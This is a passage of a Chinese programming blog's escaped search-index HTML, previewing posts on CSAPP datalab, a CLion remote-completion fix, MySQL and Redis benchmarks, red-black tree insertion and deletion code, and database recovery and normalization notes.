        return 0;
    if (e &amp;gt;= 255) // 阶码&amp;gt;=255直接返回INF
        return INF;
    return e &amp;lt;&amp;lt; 23;
    // 直接将阶码左移23位，尾数全0，规格化时尾数隐藏有1个1作为底数
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;不难&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后一题有个小插曲，就是最后一个题目测试时会提示死循环&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_a01801de3f48b76e31504865bbd88d91.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
但是逻辑是没有问题的，最后看了下测试文件的代码，在 &lt;code&gt;btest.c&lt;/code&gt; 文件的开头限制了超时时间为10s，&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_0cee5ea6673b33f2f68d77f11ed05060.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
将TIMEOUT_LIMIT修改为100，测试通过&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_a8e69e3d6dc3f9adafaf54bca8eb3990.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;最后是完整文件&#34;&gt;最后是完整文件&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://static.yulan.net.cn/image/csapp_datalab.c&#34;&gt;完整文件&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;小结&#34;&gt;小结&lt;/h2&gt;
&lt;p&gt;慕名而来看了CSAPP，不得不说看了这本书写的真的很好，看完第二章我对浮点数的认知确实更清晰了，后续我做了其他lab之后，也会逐一发上来，欢迎大家关注。&lt;/p&gt;
">CSAPP: datalab</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/qcz5ki_ozd4q9/"" data-c="
          &lt;p&gt;一直用clion做远程开发，不管是颜值还是自动补全都挺舒服，但是今天遇到一个问题，就是clion找不到Linux中的库文件，所以就没有代码补全，但是编译是正常的。更具体点，找得到 &lt;code&gt;unistd.h&lt;/code&gt;但是找不到&lt;code&gt;sys/types.h&lt;/code&gt;。&lt;br&gt;
​&lt;/p&gt;
&lt;h2 id=&#34;解决办法&#34;&gt;解决办法&lt;/h2&gt;
&lt;p&gt;点击&lt;strong&gt;Help| Find Action&lt;/strong&gt;, 输入&lt;strong&gt;Registry&lt;/strong&gt;，之后勾选&lt;strong&gt;clion.remote.tar.dereference&lt;/strong&gt;&lt;br&gt;
​&lt;/p&gt;
&lt;h2 id=&#34;原因&#34;&gt;原因&lt;/h2&gt;
&lt;p&gt;clion的remote自动补全是将远程Liunx下的相关头文件缓存到本地，而这个缓存是先使用tar打包，然后下载到本地，然而Linux上的一些头文件实际上是软链接，tar打包的时候会按软链接打包，下载到本地解压后自然无法解析。勾选clion.remote.tar.dereference是让tar命令 Enable dereference (-h) and &#39;--hard-dereference&#39; tar arguments&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_300aaae632fed92961e606c0e3a83ccd.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
这样就可以解析软链接到对应文件，下载到本地的就是文件而不是软链接。&lt;br&gt;
​&lt;/p&gt;
&lt;p&gt;修改之后再Tool -&amp;gt; Resync with remote hosts，如果还是不行就把本地缓存删掉重新Resync。&lt;br&gt;
本地缓存一般在&lt;code&gt;C:\Users\用户名\AppData\Local\JetBrains\CLion2021.1\.remote&lt;/code&gt;下，在Problems中也可以看到缓存路径（一般是` Cannot open file ***路径，Permission Denied）&lt;/p&gt;
">clion remote模式无代码补全（找不到Linux头文件）</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_zn7g7o/"" data-c="
          &lt;h1 id=&#34;环境信息&#34;&gt;环境信息&lt;/h1&gt;
&lt;p&gt;腾讯云学生机，1核Intel(R) Xeon(R) CPU E5-26xx v4 CPU，2G内存&lt;br&gt;
MySQL版本为 mysql  Ver 8.0.23 for Linux on x86_64 (MySQL Community Server - GPL)&lt;br&gt;
Redis版本为 Redis server v=4.0.9 sha=00000000:0 malloc=jemalloc-3.6.0 bits=64 build=9435c3c2879311f3&lt;/p&gt;
&lt;h1 id=&#34;mysql&#34;&gt;MySQL&lt;/h1&gt;
&lt;p&gt;使用自带的工具mysqlslap&lt;br&gt;
测试命令 ：&lt;br&gt;
mysqlslap -a --concurrency=10,20,50,100 --number-of-queries=10000 --iterations=2 -uroot -p*** --auto-generate-sql-load-type=key --auto-generate-sql-unique-write-number=100000 --auto-generate-sql-write-number=100000 --auto-generate-sql-guid-primary&lt;/p&gt;
&lt;p&gt;参数解释：&lt;br&gt;
--concurrency=10,20,50,100 --number-of-queries=10000，分别测试10、20、50、100个并发客户端，每次测试合计进行10000次查询（每个客户端执行100000/--concurrency次）&lt;br&gt;
--auto-generate-sql-unique-write-number=100000 --auto-generate-sql-write-number=100000组合使用向数据库中插入100000条不同数据&lt;br&gt;
--auto-generate-sql-guid-primary，生成uuid主键&lt;br&gt;
--auto-generate-sql-unique-query-number=10000 --auto-generate-sql-load-type=key，每个客户端执行10000条查询，查询模式为主键查询&lt;br&gt;
--iterations=2，执行2个轮次取平均&lt;br&gt;
数据采用默认模式，每行一个主键、一个int、一个varchar(128)&lt;/p&gt;
&lt;p&gt;结果：&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_23e142d7eaf6b8142efe50fafe3b6f21.png&#34; alt=&#34;图片.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;Benchmark
        Average number of seconds to run all queries: 1.083 seconds
        Minimum number of seconds to run all queries: 1.046 seconds
        Maximum number of seconds to run all queries: 1.121 seconds
        Number of clients running queries: 10
        Average number of queries per client: 1000

Benchmark
        Average number of seconds to run all queries: 1.124 seconds
        Minimum number of seconds to run all queries: 1.119 seconds
        Maximum number of seconds to run all queries: 1.129 seconds
        Number of clients running queries: 20
        Average number of queries per client: 500

Benchmark
        Average number of seconds to run all queries: 1.187 seconds
        Minimum number of seconds to run all queries: 1.164 seconds
        Maximum number of seconds to run all queries: 1.210 seconds
        Number of clients running queries: 50
        Average number of queries per client: 200

Benchmark
        Average number of seconds to run all queries: 1.371 seconds
        Minimum number of seconds to run all queries: 1.249 seconds
        Maximum number of seconds to run all queries: 1.493 seconds
        Number of clients running queries: 100
        Average number of queries per client: 100
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;按平均值计算QPS在7293&lt;sub&gt;9233。按最大最小计算QPS在6697&lt;/sub&gt;9560。&lt;/p&gt;
&lt;p&gt;再跑个写的：&lt;br&gt;
mysqlslap -a --concurrency=10,20,50,100 --number-of-queries=10000 --iterations=2 -uroot -p*** --auto-generate-sql-load-type=write --auto-generate-sql-unique-write-number=0 --auto-generate-sql-write-number=1 --auto-generate-sql-guid-primary&lt;/p&gt;
&lt;p&gt;表不变，预先写1条数据，共计写10000条数据&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_a84af0f955fe00403048789bbe6eb3ef.png&#34; alt=&#34;图片.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Benchmark
        Average number of seconds to run all queries: 11.773 seconds
        Minimum number of seconds to run all queries: 11.708 seconds
        Maximum number of seconds to run all queries: 11.838 seconds
        Number of clients running queries: 10
        Average number of queries per client: 1000

Benchmark
        Average number of seconds to run all queries: 7.843 seconds
        Minimum number of seconds to run all queries: 7.492 seconds
        Maximum number of seconds to run all queries: 8.194 seconds
        Number of clients running queries: 20
        Average number of queries per client: 500

Benchmark
        Average number of seconds to run all queries: 4.386 seconds
        Minimum number of seconds to run all queries: 4.363 seconds
        Maximum number of seconds to run all queries: 4.409 seconds
        Number of clients running queries: 50
        Average number of queries per client: 200

Benchmark
        Average number of seconds to run all queries: 3.289 seconds
        Minimum number of seconds to run all queries: 3.268 seconds
        Maximum number of seconds to run all queries: 3.310 seconds
        Number of clients running queries: 100
        Average number of queries per client: 100
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在写的场景下，反而是多个并发时QPS更高。QPS范围在849~3040。&lt;/p&gt;
&lt;h1 id=&#34;redis&#34;&gt;Redis&lt;/h1&gt;
&lt;p&gt;测试命令：&lt;br&gt;
redis-benchmark -c 100 -r 1000000000 -n 10000 -d 36 -q -t set,get,mset,hset&lt;br&gt;
100个客户端，共10000个查询，key的大小为36Byte，范围扩大到1000000000，只测试set,get,mset,hset命令&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_2c3a815fd5acb6098401a48094d9d39f.png&#34; alt=&#34;图片.png&#34; loading=&#34;lazy&#34;&gt;ubuntu@VM-0-7-ubuntu:~$ redis-benchmark -c 100 -r 1000000000 -n 10000 -d 36 -q -t set,get,mset,hsetSET: 46511.63 requests per secondGET: 47846.89 requests per second&lt;br&gt;
HSET: 47619.05 requests per second&lt;br&gt;
MSET (10 keys): 31152.65 requests per second&lt;/p&gt;
&lt;p&gt;对于get与set，QPS均在46000。&lt;/p&gt;
&lt;h1 id=&#34;汇总&#34;&gt;汇总&lt;/h1&gt;
&lt;p&gt;本次对两个数据库性能的测试使用的不同工具，且使用的数据不同，不能完全横向对比，只能做数量级上的比较，综合网上的其他资料，MySQL读的性能大约是写的2&lt;sub&gt;3倍，Redis读写性能相当，均在MySQL读性能的3&lt;/sub&gt;5倍。&lt;/p&gt;
&lt;p&gt;|&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;MySQL&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;Redis&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;读&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;7000~9000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;写&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;1000~3000&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
">MySQL与Redis的benchmark</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/sw67dr_aapnau/"" data-c="
          &lt;blockquote&gt;
&lt;p&gt;本文参考邓俊辉《数据结构（第3版）》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;定义&#34;&gt;定义&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;(1) 树根始终为黑色&lt;/li&gt;
&lt;li&gt;(2) 外部节点均为黑色&lt;/li&gt;
&lt;li&gt;(3) 某节点若为红色，则其孩子节点必为黑色&lt;/li&gt;
&lt;li&gt;(4) 从任一外部节点到根节点的沿途，黑节点的数目相等 （黑平衡）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;红黑树转换为4阶b树&#34;&gt;红黑树转换为4阶B树&lt;/h1&gt;
&lt;p&gt;在红黑树中，每当遇到红节点，就将其向上移动合并到父节点（红节点不为根，且其父节点必为黑节点），即可转换为一颗4阶B树。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_bf51fbac882a0036fadfe92fc01b4187.png&#34; alt=&#34;图片.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;插入与双红修正&#34;&gt;插入与双红修正&lt;/h1&gt;
&lt;p&gt;插入后，将新节点染色为红色，这时可能会破坏规则（3），需要进行双红修正。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;template &amp;lt;typename T&amp;gt; 
BinNodePosi&amp;lt;T&amp;gt; RedBlack&amp;lt;T&amp;gt;::insert ( const T&amp;amp; e ) { //将e插入红黑树
   BinNodePosi&amp;lt;T&amp;gt; &amp;amp; x = search ( e ); if ( x ) return x; //确认目标不存在（留意对_hot的设置）
   x = new BinNode&amp;lt;T&amp;gt; ( e, _hot, NULL, NULL, 0 ); _size++; //创建红节点x：以_hot为父，黑高度0
   BinNodePosi&amp;lt;T&amp;gt; xOld = x; solveDoubleRed ( x ); return xOld; //经双红修正后，即可返回
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在下面，设插入节点为x，其父亲为p，爷爷为g，p的兄弟为u&lt;/p&gt;
&lt;h2 id=&#34;红红-黑修正&#34;&gt;红红-黑修正&lt;/h2&gt;
&lt;p&gt;x红，p红（g必黑），u黑。&lt;br&gt;
只需要进行一次局部的3-4旋转，再对节点重新染色。修正后黑高度恢复，且新生成的局部根节点为黑色，不需要继续调整，算法结束。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_a89fb739aec93300a132c65ad62c7caf.png&#34; alt=&#34;图片.png&#34; loading=&#34;lazy&#34;&gt;3-4旋转：将任意失衡需要旋转的三个节点与他们的四颗子树进行调整，变成如下的平衡形式。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_65b42412b6941fbd777937ea17ed8ed8.png&#34; alt=&#34;图片.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;// a,b,c为三个待调整节点，T0~T3为他们的四颗子树，均按照中序遍历顺序传入
template &amp;lt;typename T&amp;gt;
BinNodePosi&amp;lt;T&amp;gt; BST&amp;lt;T&amp;gt;::connect34(
	BinNodePosi&amp;lt;T&amp;gt; a, BinNodePosi&amp;lt;T&amp;gt; b, BinNodePosi&amp;lt;T&amp;gt; c,
	BinNodePosi&amp;lt;T&amp;gt; T0, BinNodePosi&amp;lt;T&amp;gt; T1, BinNodePosi&amp;lt;T&amp;gt; T2, BinNodePosi&amp;lt;T&amp;gt; T3
) {
	a-&amp;gt;lc = T0; if (T0) T0-&amp;gt;parent = a;
	a-&amp;gt;rc = T1; if (T1) T1-&amp;gt;parent = a; updateHeight(a);
	c-&amp;gt;lc = T2; if (T2) T2-&amp;gt;parent = c;
	c-&amp;gt;rc = T3; if (T3) T3-&amp;gt;parent = c; updateHeight(c);
	b-&amp;gt;lc = a; a-&amp;gt;parent = b;
	b-&amp;gt;rc = c; c-&amp;gt;parent = b; updateHeight(b);
	return b; //该子树新的根节点
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;红红-红修正&#34;&gt;红红-红修正&lt;/h2&gt;
&lt;p&gt;x为红色，p红色，u红色。&lt;br&gt;
从等效四阶B树的角度看，节点内有四个key，发生了上溢，为了便于修正，将g选择为向上溢出的节点，节点向上合并需要染成红色，于是把g的黑高度传给他的两个儿子，将p和u染成黑色，保持了黑高度不变。此时局部根节点为红色，需要继续向上进行双红修正，当局部根节点为整个RBTree的根节点时，将其染黑，树的黑高度+1。与B树一样，红黑树从根上长高。&lt;/p&gt;
&lt;h2 id=&#34;双红修正的代码&#34;&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_4b06d620efa604e8c0fc4b0ba148a542.png&#34; alt=&#34;图片.png&#34; loading=&#34;lazy&#34;&gt;双红修正的代码&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;template &amp;lt;typename T&amp;gt; void RedBlack&amp;lt;T&amp;gt;::solveDoubleRed ( BinNodePosi&amp;lt;T&amp;gt; x ) { //x当前必为红
   if ( IsRoot ( *x ) ) //若已（递归）转至树根，则将其转黑，整树黑高度也随之递增
      {  _root-&amp;gt;color = RB_BLACK; _root-&amp;gt;height++; return;  } //否则，x的父亲p必存在
   BinNodePosi&amp;lt;T&amp;gt; p = x-&amp;gt;parent; if ( IsBlack ( p ) ) return; //若p为黑，则可终止调整。否则
   BinNodePosi&amp;lt;T&amp;gt; g = p-&amp;gt;parent; //既然p为红，则x的祖父必存在，且必为黑色
   BinNodePosi&amp;lt;T&amp;gt; u = uncle ( x ); //以下，视x叔父u的颜色分别处理
    
   if ( IsBlack ( u ) ) { //u为黑色（含NULL）时 
      if ( IsLChild ( *x ) == IsLChild ( *p ) ) //若x与p同侧（即zIg-zIg或zAg-zAg），则
         p-&amp;gt;color = RB_BLACK; //p由红转黑，x保持红
      else //若x与p异侧（即zIg-zAg或zAg-zIg），则
         x-&amp;gt;color = RB_BLACK; //x由红转黑，p保持红
      g-&amp;gt;color = RB_RED; //g必定由黑转红
///// 以上虽保证总共两次染色，但因增加了判断而得不偿失
///// 在旋转后将根置黑、孩子置红，虽需三次染色但效率更高
      BinNodePosi&amp;lt;T&amp;gt; gg = g-&amp;gt;parent; //曾祖父（great-grand parent）
      BinNodePosi&amp;lt;T&amp;gt; r = FromParentTo ( *g ) = rotateAt ( x ); //调整后的子树根节点
      // FromParentTo获取从父节点指过来的指针，rotateAt自动进行3-4旋转
       
      r-&amp;gt;parent = gg; //与原曾祖父联接
   } else { //若u为红色 //*DSA*/printf(&amp;quot;  case RR-2:\n&amp;quot;);
      p-&amp;gt;color = RB_BLACK; p-&amp;gt;height++; //p由红转黑
      u-&amp;gt;color = RB_BLACK; u-&amp;gt;height++; //u由红转黑
      if ( !IsRoot ( *g ) ) g-&amp;gt;color = RB_RED; //g若非根，则转红
      solveDoubleRed ( g ); //继续调整g（类似于尾递归，可优化为迭代形式）
   }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;删除与双黑修正&#34;&gt;删除与双黑修正&lt;/h1&gt;
&lt;p&gt;删除时保证删除节点无左孩子（否则将key与其直接后继交换，然后去删除其直接后继）&lt;br&gt;
此时记被删除节点为 x，其替代节点（右孩子）为 r，父节点为 p 。&lt;/p&gt;
&lt;p&gt;若 x 为根，则用 r 替代 x ，并将 r 染黑，此时树的黑高度减1。&lt;/p&gt;
&lt;p&gt;当 x 为红时（由于 x 无左孩子，根据定义其一定无右孩子，于是为叶子节点），直接删去由 r 来替代（即设为NULL，颜色为黑），不会对树的平衡性造成影响。&lt;/p&gt;
&lt;p&gt;当 x 为黑色， r 为红色时，由 r 来继承 x 的黑高度，删去 x 由 r 来替代，并将 r 染黑，对数的黑高度无任何影响，删除结束。&lt;/p&gt;
&lt;p&gt;当 x 与 r 均为黑色时，需要进行双黑调整。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;template &amp;lt;typename T&amp;gt; 
bool RedBlack&amp;lt;T&amp;gt;::remove ( const T&amp;amp; e ) { //从红黑树中删除关键码e
   BinNodePosi&amp;lt;T&amp;gt; &amp;amp; x = search ( e ); if ( !x ) return false; //确认目标存在（留意_hot的设置）
   BinNodePosi&amp;lt;T&amp;gt; r = removeAt ( x, _hot ); if ( ! ( --_size ) ) return true; //实施删除
// assert: _hot某一孩子刚被删除，且被r所指节点（可能是NULL）接替。以下检查是否失衡，并做必要调整
   if ( ! _hot ) //若刚被删除的是根节点，则将其置黑，并更新黑高度
      { _root-&amp;gt;color = RB_BLACK; updateHeight ( _root ); return true; }
// assert: 以下，原x（现r）必非根，_hot必非空
   if ( BlackHeightUpdated ( *_hot ) ) return true; //若所有祖先的黑深度依然平衡，则无需调整
   if ( IsRed ( r ) ) //否则，若r为红，则只需令其转黑
      { r-&amp;gt;color = RB_BLACK; r-&amp;gt;height++; return true; }
// assert: 以下，原x（现r）均为黑色
   //*DSA*/printBinTree(_hot, 0, 0);
   solveDoubleBlack ( r ); return true; //经双黑调整后返回
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_a7c134278d37ac2229f65357ef0b0848.png&#34; alt=&#34;图片.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
图中w必为NULL（黑色）&lt;/p&gt;
&lt;p&gt;双黑修正时，原黑节点x的兄弟必然非空（否则不满足黑平衡），将其记作s；x 的父亲记作p，其颜色不确定。&lt;/p&gt;
&lt;h2 id=&#34;case1黑黑-黑带红修正&#34;&gt;case1：黑黑-黑带红修正&lt;/h2&gt;
&lt;p&gt;x、r 均为黑，s 也为黑，且 s 有红色的孩子 t。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_ac34805c06e74a60ec5e13a78fea0343.png&#34; alt=&#34;图片.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
由于存在调整时递归向上传递问题，r 可能不为 NULL&lt;/p&gt;
&lt;p&gt;按照B树来看，x 无左孩子，且右孩子为黑色，其为一个只有一个key的节点，将 x 删除后B树发生下溢，若 其兄弟 s 有红色孩子，则按照B树来看该兄弟节点的key足够借，故从兄弟节点借一个关键字。&lt;br&gt;
此时按照红黑树来看，相当于在 t 、s、 p 之间做了一次3-4旋转。旋转后，由于 s 被借走，其所属B树节点可能只剩下一个红key，由于此时B树的高度并不应该改变，故需要让 t 继承 s 的黑高度，将其染黑，s 则继承原来 p 的颜色，p 继承原属于 x 的黑色。&lt;/p&gt;
&lt;p&gt;对于 t 为 s 的右孩子，处理方式类似，在3-4旋转后统一进行染色，可以避免复杂的判断。&lt;/p&gt;
&lt;h2 id=&#34;黑黑-黑不带红&#34;&gt;黑黑-黑不带红&lt;/h2&gt;
&lt;p&gt;当 s 没有红孩子时，从B树的角度来看，此时属于下溢且兄弟不够借，依据 p 的颜色又可分为2种情形。&lt;/p&gt;
&lt;h3 id=&#34;case2p-为红&#34;&gt;case2：p 为红&lt;/h3&gt;
&lt;p&gt;此时在B树中，p所在的节点必然还有一个黑色的key，于是将p借下来把，将 x 与 s 粘合在一起，之后再去删除 x&lt;br&gt;
由于 p 所在节点还有其他key，故借走 p 不会引起再一次的下溢，该过程不需要递归执行。&lt;br&gt;
粘合后的 s、p、x 节点的key的颜色为 黑、红、黑，并不符合红黑树向B树转换的规定（只有红节点向上合并），需要染色为 红、黑、红，之后再去删除 x 节点和 x 左孩子（NULL）。&lt;br&gt;
该过程体现在红黑树上就是将 p 染黑，s 染红。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_f7af30f1ebebb12bd6a12eb6d5ca8b97.png&#34; alt=&#34;图片.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;case3p-为黑&#34;&gt;case3：p 为黑&lt;/h3&gt;
&lt;p&gt;此时按照对应B树来看，属于下溢出且兄弟不够借，父节点也只有一个key的情景。&lt;br&gt;
此时的操作方式与前面类似，需要将 s 染红，p 保持黑色，这时按照B树来看，父节点只有一个key，借走后会再一次下溢，这也是红黑树删除时唯一需要递归调整的地方。此时递归向上时，相当于虚拟一个新的 x 节点替代 p 节点原来的位置，同时令其左子树为空，右孩子为 p。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_8e4f0ad4d4b6523906db45720c63dcc5.png&#34; alt=&#34;图片.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;case4黑黑-红修正&#34;&gt;case4：黑黑-红修正&lt;/h2&gt;
&lt;p&gt;最后一种情况，考虑 s 为红色，此时 s 一定有两个黑孩子，且 p 一定为黑色，从B树的角度考虑，交换 s 与 p 的颜色对B树没有任何影响，反应到红黑树上，相当于以 p 点为轴做一次左旋（对称的情景下做右旋），并交换 s 与 p 的颜色。这样做不能解决双黑缺陷，但是转换后有一个新的兄弟 s&#39; ，且一定是黑色，并且 p 一定是红色，此时将变成 case1或 case2，再进行一次调整即可。&lt;br&gt;
case4的处理存在一些技巧性的操作，个人想不到怎么从B树的角度来看待。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_cab86e9550f6ca82c71c469b10f887c5.png&#34; alt=&#34;图片.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;双黑修正代码&#34;&gt;双黑修正代码&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;template &amp;lt;typename T&amp;gt; 
void RedBlack&amp;lt;T&amp;gt;::solveDoubleBlack ( BinNodePosi&amp;lt;T&amp;gt; r ) {
   BinNodePosi&amp;lt;T&amp;gt; p = r ? r-&amp;gt;parent : _hot; if ( !p ) return; //r的父亲
   BinNodePosi&amp;lt;T&amp;gt; s = ( r == p-&amp;gt;lc ) ? p-&amp;gt;rc : p-&amp;gt;lc; //r的兄弟
   if ( IsBlack ( s ) ) { //兄弟s为黑
      BinNodePosi&amp;lt;T&amp;gt; t = NULL; //s的红孩子（若左、右孩子皆红，左者优先；皆黑时为NULL）
      if ( IsRed ( s-&amp;gt;rc ) ) t = s-&amp;gt;rc; //右子
      if ( IsRed ( s-&amp;gt;lc ) ) t = s-&amp;gt;lc; //左子
      if ( t ) { // case1：黑黑-黑带红
          RBColor oldColor = p-&amp;gt;color; //备份原子树根节点p颜色，并对t及其父亲、祖父
      // 以下，通过旋转重平衡，并将新子树的左、右孩子染黑
         BinNodePosi&amp;lt;T&amp;gt; b = FromParentTo ( *p ) = rotateAt ( t ); //以t的爷爷为总轴进行3-4旋转
         if ( HasLChild ( *b ) ) { b-&amp;gt;lc-&amp;gt;color = RB_BLACK; updateHeight ( b-&amp;gt;lc ); } //左子
         if ( HasRChild ( *b ) ) { b-&amp;gt;rc-&amp;gt;color = RB_BLACK; updateHeight ( b-&amp;gt;rc ); } //右子
         b-&amp;gt;color = oldColor; updateHeight ( b ); //新子树根节点继承原根节点的颜色

      } else { //case2、3：黑黑-黑无红孩子
         s-&amp;gt;color = RB_RED; s-&amp;gt;height--; //s转红
         if ( IsRed ( p ) ) { //case2：p为红
            p-&amp;gt;color = RB_BLACK; //p转黑，但黑高度不变
         } else { //case3：p为黑
            p-&amp;gt;height--; //p保持黑，但黑高度下降
            solveDoubleBlack ( p ); //递归上溯
         }
      }
   } else { //case4：黑黑-红
      s-&amp;gt;color = RB_BLACK; p-&amp;gt;color = RB_RED; //s转黑，p转红
      BinNodePosi&amp;lt;T&amp;gt; t = IsLChild ( *s ) ? s-&amp;gt;lc : s-&amp;gt;rc; //取t与其父s同侧
      _hot = p; FromParentTo ( *p ) = rotateAt ( t ); //对t及其父亲、祖父做平衡调整
      solveDoubleBlack ( r ); //继续修正r处双黑——此时的p已转红，故后续只能是BB-1或BB-2R
   }
}
&lt;/code&gt;&lt;/pre&gt;
">红黑树</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_gledvl/"" data-c="
          &lt;h2 id=&#34;数据转储&#34;&gt;数据转储&lt;/h2&gt;
&lt;p&gt;简而言之，就是备份。&lt;/p&gt;
&lt;h3 id=&#34;海量全量转储与增量转储&#34;&gt;海量（全量）转储与增量转储&lt;/h3&gt;
&lt;p&gt;全量就是全备份，增量就是增量备份。&lt;/p&gt;
&lt;h2 id=&#34;日志&#34;&gt;日志&lt;/h2&gt;
&lt;p&gt;如MySql的Binlog，就是以记录为单位的日志，每一个事务都会被记录（不一定刷新到磁盘，&lt;code&gt;sync_binlog&lt;/code&gt; 的设置相关）&lt;/p&gt;
">《数据库系统概念》--数据库恢复技术</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_lh2wgf/"" data-c="
          &lt;h2 id=&#34;不错的参考httpswwwzhihucomquestion24696366&#34;&gt;不错的参考&lt;a href=&#34;https://www.zhihu.com/question/24696366&#34;&gt;https://www.zhihu.com/question/24696366&lt;/a&gt;&lt;/h2&gt;
&lt;h2 id=&#34;码和主属性&#34;&gt;码和主属性&lt;/h2&gt;
&lt;p&gt;若有X，属性的全集U完全函数依赖与X，则X是一个码。&lt;br&gt;
全部码的集合是主属性。&lt;/p&gt;
&lt;h2 id=&#34;函数依赖&#34;&gt;函数依赖&lt;/h2&gt;
&lt;p&gt;如果存在模式 (A,B) ，则A可以作为主键，这就是函数依赖，写作&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_56e601e945c388147f033f31511faed5.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
称作B依赖于A，或A函数确定B&lt;/p&gt;
&lt;h2 id=&#34;1nf第一范式&#34;&gt;1NF，第一范式&lt;/h2&gt;
&lt;p&gt;如果一个关系模式R的全部属性都是原子的、不可再分的，那么它满足第一范式。&lt;br&gt;
对于关系course中的属性course_id，我们可能会使用CS-101这样的课程标识号，其中CS代表系，如果在应用程序中通过额外的编程将CS解析为计算机系，那么就认为course_id属性可以再分，不是原子的。&lt;br&gt;
但是如果单独存储dept_name属性，那么系名就不从course_id中解析，可以认为其是原子的，那么这个关系模式符合第一范式。&lt;/p&gt;
&lt;h2 id=&#34;2nf&#34;&gt;2NF&lt;/h2&gt;
&lt;p&gt;消除非主属性对码的部分函数依赖&lt;/p&gt;
&lt;h2 id=&#34;使用函数依赖进行分解&#34;&gt;使用函数依赖进行分解&lt;/h2&gt;
&lt;h3 id=&#34;码和函数依赖&#34;&gt;码和函数依赖&lt;/h3&gt;
&lt;p&gt;关系模式r（R），r指关系，R指关系中的全部属性。&lt;br&gt;
&lt;strong&gt;超码&lt;/strong&gt; ： 设关系模式r(R)，R的子集K，对于r的实例中的全部元组对t1与t2，若 t1!=t2，则有t1[K] != t2[K]，那么K是关系r的超码。&lt;br&gt;
